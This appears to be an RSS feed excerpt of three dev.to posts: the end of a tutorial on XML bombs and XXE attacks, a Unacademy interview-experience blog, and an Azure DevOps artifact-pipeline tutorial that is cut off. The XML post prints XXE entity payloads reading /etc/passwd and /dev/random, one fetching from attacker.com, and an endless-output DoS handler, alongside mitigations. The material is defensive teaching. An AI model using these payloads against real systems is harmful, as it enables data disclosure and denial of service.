&lt;p&gt;If the application needed the expanded form of the relevant entity it would have to construct it directly and in the process have the appropriate checks to avoid causing the Denial of Service itself.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With the entity size limited, if an XML Bomb were parsed it would exceed this limit and the XML parser would throw an exception instead of causing a Denial of Service. Naturally, the limit must be set such that it does not impair useful functionality of valid uses.&lt;br&gt;
Here's an example in Ruby's REXML parser:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;REXML::Document.entity_expansion_limit = 0
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;No entity expansion will be permitted with this configuration since the resulting size would exceed zero.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#xml-external-entity-xxe-attacks"&gt;
  &lt;/a&gt;
  XML External Entity (XXE) Attacks
&lt;/h2&gt;

&lt;p&gt;One feature of XML that can be used to attack an application is the external entity. By providing an XML input containing a reference to an external entity an attacker can cause the XML parser to read the referenced data and process it into the resultant XML data. The XML External Entity is a way for values replacement to be pulled from external URIs so it can potentially access files as well as network resources. If there is a pathway to expose the resulting data the attacker can manage to ex-filtrate the data by exploiting the access privileges of the XML parser process. Alternatively, by referencing a very large data source this can also lead to Denial of Service.&lt;/p&gt;

&lt;p&gt;For example, consider an XML input that references the file /dev/random, a file stream of pseudorandom bytes that is endless (specifically, successive reading of random bytes will block when the system entropy pool is drained, resupplying more data when entropy is built back up). Since an XML parser will read data from the external entity until end-of-file, it will endlessly consume and construct data eventually overloading the system to failure.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;!ENTITY xxe SYSTEM "file:///dev/random" &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;An example of information disclosure could be an XML input that references the file /etc/passwd, the file of user logon information in classic Unix systems. &lt;br&gt;
Modern systems no longer store password information but this file potentially contains user names and private contact information.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;In the following example, we see how an attacker can achieve Denial of Service through an XXE attack. In this case, the XXE entity is replaced by the result of executing dos.ashx. As we can see below, the dos.ashx program produces output in an infinite loop, so the XXE entity will keep growing indefinitely. &lt;br&gt;
If, in addition to that infinite loop, an attacker manages to execute the program dos.ashx on another machine, then the DoS will affect that machine as well.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;ASHX file extension is an ASP.NET Web Handler file that often holds references to other web pages used in an ASP.NET web server application.&lt;br&gt;
&lt;/p&gt;


&lt;/blockquote&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;&amp;lt;!ENTITY xxe SYSTEM "http://www.attacker.com/dos.ashx" &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;// dos.ashx
public void ProcessRequest(HttpContext context) {
  context.Response.ContentType = "text/plain";
  byte[] data = new byte[1000000];

  for (int i = 0; i&amp;lt;data.Length; i++)
    data[i] = (byte)’A’;
  while (true) {
    context.Response.OutputStream.Write(data, 0, data.Length);
    context.Response.Flush();
  }
}

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#mitigating-xxe-attacks"&gt;
  &lt;/a&gt;
  Mitigating XXE Attacks
&lt;/h3&gt;

&lt;p&gt;The easiest way is to configure the XML parser to avoid resolving external references entirely, here two examples in .Net 4.0 and PHP:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;XmlReaderSettings settings = new XmlReaderSettings();
settings.XmlResolver = null;
XmlReader reader = XmlReader.Create(stream, settings);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;





&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;libxml_disable_entity_loader(true);
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Of course, XML external entities can be useful or even essential, in which case completely disabling the feature is not an acceptable solution. In these cases consider configuring, or if necessary, modifying the XML parser in order to apply one or more of these strategies:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Enforce a timeout to prevent delaying or very large data volume attacks.&lt;/li&gt;
&lt;li&gt;Limit the type and amount of data that can be retrieved.&lt;/li&gt;
&lt;li&gt;Restrict the XmlResolver from retrieving resources on the local host.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion:
&lt;/h2&gt;

&lt;p&gt;XML attacks happen when an application that parses specially-crafted XML input causes harm. &lt;br&gt;
Two well-known attacks are XML Bombs (Denial of Service), and XXE or XML External Entity (information disclosure or Denial of Service).&lt;br&gt;
The preferred mitigation is the configuration of the XML parser to disable or at least safely limit the features of XML that cause these problems as described above. When configuration is not sufficient, the XML parser needs modification but this is a more risky and labor intensive method.&lt;/p&gt;

</description>
      <category>security</category>
      <category>webdev</category>
      <category>xml</category>
    </item>
    <item>
      <title>Unacademy Software Engineer interview experience, Web</title>
      <author>Kushagra Mehta</author>
      <pubDate>Sat, 07 Aug 2021 15:33:19 +0000</pubDate>
      <link>https://dev.to/kushagra_mehta/unacademy-software-engineer-interview-experience-web-14d4</link>
      <guid>https://dev.to/kushagra_mehta/unacademy-software-engineer-interview-experience-web-14d4</guid>
      <description>&lt;p&gt;Hello everyone,&lt;br&gt;
I'm Kushagra Mehta, a final year student from Jaipur. I have joined Unacademy as a Software Engineer. In today's blog, I'll be sharing my interview experience at Unacademy for a Software Engineer position.&lt;br&gt;
&lt;a href="https://i.giphy.com/media/Kx8BFbGTiW95FDnUR3/giphy.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://i.giphy.com/media/Kx8BFbGTiW95FDnUR3/giphy.gif" alt="Unacademy-logo"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Big shoutout to &lt;a href="https://www.linkedin.com/in/rajatetc/"&gt;Rajat Gupta&lt;/a&gt; who, wrote a great Interview experience article that helps me along the way. &lt;a href="https://rajatgupta.xyz/unacademy-interview"&gt;Link🔗&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#how-it-started"&gt;
  &lt;/a&gt;
  How it started?
&lt;/h2&gt;

&lt;p&gt;Hmm, This is an interesting one. From my side, I did some cold-DM's in mid of Jun-21 asking for interviews(&lt;a href="https://www.youtube.com/watch?v=_wQGd6Crkaw&amp;amp;list=PLLbfvOX935JELl4VMj-Sao382KYNJctly&amp;amp;index=28"&gt;&lt;em&gt;Great videos on it&lt;/em&gt;&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;Then on the sweet morning of 13-Jul, I got a call from HR team of Unacademy asking that, Was I available for an interview or not. From here, my journey started, So the call goes like this&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;** &lt;strong&gt;Basic introduction&lt;/strong&gt; **&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;HR&lt;/strong&gt;: &lt;em&gt;Can you tell me something about yourself&lt;/em&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Me&lt;/strong&gt;: &lt;em&gt;I'm kushagra.....&lt;/em&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;HR&lt;/strong&gt;: &lt;em&gt;Awsome man&lt;/em&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Me&lt;/strong&gt;: 😳 &lt;strong&gt;OK.!!&lt;/strong&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;HR&lt;/strong&gt;: &lt;em&gt;Let's schedule a call for your next round&lt;/em&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;strong&gt;Me&lt;/strong&gt;: 😮 &lt;em&gt;Why not&lt;/em&gt; (Inside me:- Am I dreaming or what 😶)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The recruiter explained everything related to the next rounds over the call and scheduled the first round.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;I asked my recruiter where he got my profile from, he said he liked my &lt;a href="https://www.linkedin.com/in/kushagra-mehta-/"&gt;LinkedIn&lt;/a&gt; &amp;amp; &lt;a href="https://github.com/KushagraMehta/"&gt;Github&lt;/a&gt; profile and that's why he reached out to me. So boys and girls it's time to improve your online profiles.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#interview-rounds"&gt;
  &lt;/a&gt;
  Interview rounds✨
&lt;/h2&gt;

&lt;ol&gt;
&lt;li&gt;JS Fundamentals (~ 1 hr)&lt;/li&gt;
&lt;li&gt;Frontend with React (~ 1 hr)&lt;/li&gt;
&lt;li&gt;Senior Engineering Manager (~ 30 m)&lt;/li&gt;
&lt;li&gt;Culture ( ~ 30 m)&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;strong&gt;Platform&lt;/strong&gt;: &lt;em&gt;Google Meet&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Coding Environment&lt;/strong&gt;: &lt;em&gt;CodeSandbox&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;Let's dive into each round in detail.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#js-fundamentals"&gt;
  &lt;/a&gt;
  👨🏻‍💻 JS Fundamentals
&lt;/h2&gt;

&lt;p&gt;It started with a simple intro. Then we quickly jumped into the realm of JS. The questions revolved around basics concepts of Javascript like:- &lt;code&gt;this&lt;/code&gt;, &lt;code&gt;let&lt;/code&gt;/&lt;code&gt;var&lt;/code&gt;/&lt;code&gt;const&lt;/code&gt;, &lt;code&gt;Promises&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The interview was more around discussion-based, &lt;strong&gt;Why&lt;/strong&gt; or &lt;strong&gt;How&lt;/strong&gt; something is happening. We started with output-based questions,  where we discussed &lt;em&gt;What&lt;/em&gt;, &lt;em&gt;Why&lt;/em&gt; &amp;amp; &lt;em&gt;How&lt;/em&gt; things are happening.&lt;/p&gt;

&lt;p&gt;He told me to implement &lt;code&gt;Promises&lt;/code&gt; after that, we discussed my approach.&lt;/p&gt;

&lt;p&gt;At last, we discussed &lt;code&gt;eventHandling&lt;/code&gt;, &lt;code&gt;debouncing&lt;/code&gt; &amp;amp; &lt;code&gt;throttling&lt;/code&gt;. After that, I was asked to build debouncing function and implement a use-case for it(build Search bar).&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How to prepare&lt;/strong&gt;:&lt;a href="https://javascript.info/"&gt;💛javascript.info&lt;/a&gt;, &lt;a href="https://www.youtube.com/playlist?list=PLlasXeu85E9eV5xUEgrWUB8NAUvNZGsK0"&gt;Akshay Saini - FE Interview Ques&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Everything was chill, he helped me in every step of the interview. Even when I did something wrong with &lt;code&gt;.addEventListener&lt;/code&gt; he explained why things are not working and helped me with the process🤯&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#frontend-with-react"&gt;
  &lt;/a&gt;
  ⚛️Frontend with React
&lt;/h2&gt;

&lt;p&gt;This happened the day after the first round. We started with building a &lt;a href="https://www.google.com/search?q=google+timer"&gt;Google timer clone&lt;/a&gt;. I was asked to explain the approach I took.&lt;/p&gt;

&lt;p&gt;After that, We discussed some basic concepts of JavaScript&lt;br&gt;
closures, &lt;code&gt;setTimeout&lt;/code&gt;, &lt;code&gt;this&lt;/code&gt;, &lt;code&gt;async&lt;/code&gt;/&lt;code&gt;await&lt;/code&gt;, &lt;code&gt;promises&lt;/code&gt;, &lt;code&gt;async&lt;/code&gt;/&lt;code&gt;defer&lt;/code&gt;, event loop... Then we jumped into some basic CSS questions like &lt;code&gt;inline&lt;/code&gt;/&lt;code&gt;inline-block&lt;/code&gt;, Box model, etc.&lt;/p&gt;

&lt;p&gt;Then we jumped into the territory of ReactJs. The questions ranged from what is React, State/Props, Lifecycle methods, Lifecycle in Class components vs Functional components, Virtual DOM.&lt;/p&gt;

&lt;p&gt;At last, I was given a basic problem to solve &lt;a href="https://www.geeksforgeeks.org/sort-an-array-of-0s-1s-and-2s/"&gt;Sort an array of 0s, 1s and 2s&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How to prepare&lt;/strong&gt;: &lt;a href="http://frontendinterviewhandbook.com/"&gt;Front End Interview Handbook✨&lt;/a&gt;, &lt;a href="https://github.com/sudheerj/reactjs-interview-questions#what-is-react"&gt;List of top 500 ReactJS Interview Ques😵&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;This round was also super chill. I stuttering a lot in explaining things. Even I got confused in some question, but interviewer helped me understand them🤯.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#senior-engineering-manager"&gt;
  &lt;/a&gt;
  👨🏻‍💼Senior Engineering Manager
&lt;/h2&gt;

&lt;p&gt;It was more of a discussion on my decisions over tech-stack, team dynamics, and culture fit. It started with technical questions on Why I choose ReactJs, what I did in my previous internship, What I learned from there, and What I did not like there.&lt;/p&gt;

&lt;p&gt;Then he asked me some behavioral questions like:&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;&lt;em&gt;How will you suggest someone to opt ReactJs rather than other options?&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;What if there is some conflict with your manager. How will you resolve them?&lt;/em&gt;&lt;/li&gt;
&lt;li&gt;&lt;em&gt;What if a mentor in a new Organization is not helping much how would you be going to tackle the situation?&lt;/em&gt;&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Then I was asked, If I have any questions for them and what I would like to work on.(&lt;em&gt;If you see my profile, I'm more of a full-stack guy.&lt;/em&gt; 😅 &lt;em&gt;They said we're a flexible team you can work on anything until you're sure about its working&lt;/em&gt; 🤩)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;How to prepare&lt;/strong&gt;: &lt;a href="https://drive.google.com/file/d/1_uFUgT469LGn_X3swjY-L9j0KBqK9ocv/view?usp=sharing"&gt;60 Toughest Interview Questions😎&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;After this round, I got very excited as I wanted to work as a Full-stack guy and got a green flag from the Manager. 🕺🏻&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#culture"&gt;
  &lt;/a&gt;
  Culture
&lt;/h2&gt;

&lt;p&gt;In this round, we discussed the working of the company.&lt;/p&gt;

&lt;p&gt;This round was all about behavioral and situation questions like how will you react if the project you're working on for a few months gets shelved.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#the-end"&gt;
  &lt;/a&gt;
  🥳The End
&lt;/h2&gt;

&lt;p&gt;After all these rounds, I got an Offer letter💌 and I accepted it (&lt;em&gt;Volla&lt;/em&gt; 🎊).&lt;br&gt;
I really liked the complete interview process at Unacademy. All the rounds were more oriented toward discussion rather than typical Questions and Answers sessions.&lt;/p&gt;

&lt;p&gt;Big thanks to &lt;strong&gt;Unacademy&lt;/strong&gt; for giving me chance to prove myself and to the Talent Acquisition team for the wonderful interview experience. I can't even imagine that I would ever receive an offer from Unacadmey, whole process was like a dream to me (&lt;em&gt;some say I'm still dreaming till this date&lt;/em&gt; 😳)&lt;/p&gt;

&lt;p&gt;If you're someone who wants to build the future of education, please apply here 👉🏻&lt;a href="https://apply.workable.com/unacademy/"&gt;https://apply.workable.com/unacademy/&lt;/a&gt;&lt;/p&gt;

</description>
      <category>webdev</category>
      <category>interview</category>
      <category>job</category>
      <category>react</category>
    </item>
    <item>
      <title>Consume artifacts from a remote DevOps project pipeline</title>
      <author>Marcel.L</author>
      <pubDate>Sat, 07 Aug 2021 14:06:14 +0000</pubDate>
      <link>https://dev.to/pwd9000/consume-artifacts-from-a-remote-devops-project-pipeline-2f3a</link>
      <guid>https://dev.to/pwd9000/consume-artifacts-from-a-remote-devops-project-pipeline-2f3a</guid>
      <description>&lt;h2&gt;
  &lt;a href="#azure-devops-pipelineyaml-resources"&gt;
  &lt;/a&gt;
  Azure DevOps pipeline/YAML resources
&lt;/h2&gt;

&lt;p&gt;Azure DevOps pipelines provides very useful &lt;a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/process/resources?view=azure-devops&amp;amp;tabs=schema"&gt;resources&lt;/a&gt; we can define in our pipeline in one place and be consumed anywhere in our pipeline.&lt;/p&gt;

&lt;p&gt;A resource is anything used by a pipeline that lives outside the pipeline. Pipeline resources include:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;CI/CD pipelines that produce artifacts (Azure Pipelines, Jenkins, etc.)&lt;/li&gt;
&lt;li&gt;code repositories (Azure Repos Git repos, GitHub, GitHub Enterprise, Bitbucket Cloud)&lt;/li&gt;
&lt;li&gt;container image registries (Azure Container Registry, Docker Hub, etc.)&lt;/li&gt;
&lt;li&gt;package feeds (GitHub packages)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Today we will take a look at the &lt;a href="https://docs.microsoft.com/en-us/azure/devops/pipelines/process/resources?view=azure-devops&amp;amp;tabs=schema#resources-pipelines"&gt;Pipelines Resource&lt;/a&gt;, in particular we will look at how we can use this resource in a pipeline to consume an artifact that was produced in another pipeline in a completely different project. Our pipeline will also even be triggered automatically by the source pipeline after the artifact has been created and published.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#consume-remote-pipeline-artifacts"&gt;
  &lt;/a&gt;
  Consume remote pipeline artifacts
&lt;/h2&gt;

&lt;p&gt;In my DevOps organisation I have created two projects namely &lt;strong&gt;ProjectA&lt;/strong&gt; and &lt;strong&gt;ProjectB&lt;/strong&gt;. I also created two YAML pipelines for each corresponding project named &lt;strong&gt;PipelineA&lt;/strong&gt; and &lt;strong&gt;PipelineB&lt;/strong&gt;. &lt;strong&gt;PipelineA&lt;/strong&gt; will be my triggering/source pipeline which will create an artifact called &lt;strong&gt;ArtifactA&lt;/strong&gt;. &lt;strong&gt;PipelineB&lt;/strong&gt; will be my pipeline which will contain the pipeline resource for &lt;strong&gt;PipelineA&lt;/strong&gt; and will consume &lt;strong&gt;ArtifactA&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--qlSBoN_H--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/main-ado.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--qlSBoN_H--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/main-ado.png" alt="main"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In &lt;strong&gt;ProjectA&lt;/strong&gt; I also created a repository called &lt;strong&gt;RepoA&lt;/strong&gt; which contains a file called &lt;strong&gt;MyConfig.txt&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ULHy0L5R--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/projects.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ULHy0L5R--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/projects.png" alt="projects"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--FJmFhe_V--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/myconfig.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--FJmFhe_V--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/myconfig.png" alt="myConfig"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;I also created the following code in &lt;strong&gt;PipelineA.yml&lt;/strong&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="c1"&gt;## code/PipelineA.yml&lt;/span&gt;

&lt;span class="na"&gt;trigger&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;none&lt;/span&gt;

&lt;span class="na"&gt;stages&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
&lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;stage&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Build_Artifact&lt;/span&gt;
  &lt;span class="na"&gt;displayName&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Build Artifact A&lt;/span&gt;

  &lt;span class="na"&gt;jobs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
  &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;job&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Build&lt;/span&gt;
    &lt;span class="na"&gt;displayName&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Build&lt;/span&gt;
    &lt;span class="na"&gt;pool&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
      &lt;span class="na"&gt;name&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;Azure Pipelines&lt;/span&gt;
      &lt;span class="na"&gt;vmImage&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;windows-2019&lt;/span&gt;

    &lt;span class="na"&gt;steps&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
    &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;task&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;CopyFiles@2&lt;/span&gt;
      &lt;span class="na"&gt;displayName&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;Copy&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;myConfig&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;to&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;Staging'&lt;/span&gt;
      &lt;span class="na"&gt;inputs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
        &lt;span class="na"&gt;SourceFolder&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;$(Build.SourcesDirectory)'&lt;/span&gt;
        &lt;span class="na"&gt;Contents&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;MyConfig.txt'&lt;/span&gt;
        &lt;span class="na"&gt;TargetFolder&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;$(Build.ArtifactStagingDirectory)/drop'&lt;/span&gt;

    &lt;span class="pi"&gt;-&lt;/span&gt; &lt;span class="na"&gt;task&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;PublishPipelineArtifact@1&lt;/span&gt;
      &lt;span class="na"&gt;displayName&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;Publish&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;Artifact&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;to&lt;/span&gt;&lt;span class="nv"&gt; &lt;/span&gt;&lt;span class="s"&gt;Pipeline'&lt;/span&gt;
      &lt;span class="na"&gt;inputs&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
        &lt;span class="na"&gt;targetPath&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;'&lt;/span&gt;&lt;span class="s"&gt;$(Build.ArtifactStagingDirectory)/drop'&lt;/span&gt;
        &lt;span class="na"&gt;artifactName&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;ArtifactA&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; It is important to note that when we create the above pipeline in our source project we must rename the pipeline to the same name as what we will refer to it in our pipeline resource on &lt;strong&gt;PipelineB&lt;/strong&gt;. In my case I will refer to this as &lt;strong&gt;PipelineA&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--uBtGsuOQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/rename.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--uBtGsuOQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/rename.png" alt="rename"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The above YAML pipeline will take the file &lt;strong&gt;MyConfig.txt&lt;/strong&gt; and create a pipeline artifact containing the file called &lt;strong&gt;ArtifactA&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--5UAiAs4d--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/pipelineA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5UAiAs4d--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/pipelineA.png" alt="pipelineA"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Dmc68ET0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/artifactA.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Dmc68ET0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Pwd9000-ML/blog-devto/master/posts/DevOps-Pipeline-from-Pipeline/assets/artifactA.png" alt="artifactA"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;In &lt;strong&gt;ProjectB&lt;/strong&gt; I have &lt;strong&gt;PipelineB.yml&lt;/strong&gt; that contains the pipeline resource for &lt;strong&gt;PipelineA&lt;/strong&gt; and will be triggered once &lt;strong&gt;PipelineA&lt;/strong&gt; completes and we will use the download task to also consume the artifact that was produced by &lt;strong&gt;PipelineA&lt;/strong&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight yaml"&gt;&lt;code&gt;&lt;span class="c1"&gt;## code/PipelineB.yml&lt;/span&gt;

&lt;span class="na"&gt;trigger&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;none&lt;/span&gt;
&lt;span class="na"&gt;pr&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt; &lt;span class="s"&gt;none&lt;/span&gt;

&lt;span class="c1"&gt;# ------ This is our Pipeline Resource ------&lt;/span&gt;
&lt;span class="na"&gt;resources&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
  &lt;span class="na"&gt;pipelines&lt;/span&gt;&lt;span class="pi"&gt;:&lt;/span&gt;
